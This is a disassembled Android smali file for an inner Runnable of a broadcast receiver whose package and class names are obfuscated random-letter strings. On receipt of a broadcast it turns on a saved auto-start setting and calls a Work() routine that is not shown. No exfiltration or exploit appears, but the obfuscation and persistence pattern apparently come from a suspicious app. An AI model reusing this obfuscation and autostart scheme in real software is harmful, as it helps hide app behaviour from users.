.class Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_RC$1;
.super Ljava/lang/Object;
.source "kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_RC.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_RC;->onReceive(Landroid/content/Context;Landroid/content/Intent;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_RC;

.field final synthetic val$mContext:Landroid/content/Context;


# direct methods
.method constructor <init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_RC;Landroid/content/Context;)V
    .locals 0

    .line 166
    iput-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_RC$1;->this$0:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_RC;

    iput-object p2, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_RC$1;->val$mContext:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .line 168
    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->NeedAutoStart()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_RC$1;->val$mContext:Landroid/content/Context;

    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->AutoStartOn:Ljava/lang/String;

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 170
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_RC$1;->val$mContext:Landroid/content/Context;

    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->AutoStartOn:Ljava/lang/String;

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 173
    :cond_0
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_RC$1;->val$mContext:Landroid/content/Context;

    invoke-static {v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_RC;->Work(Landroid/content/Context;)V

    return-void
.end method
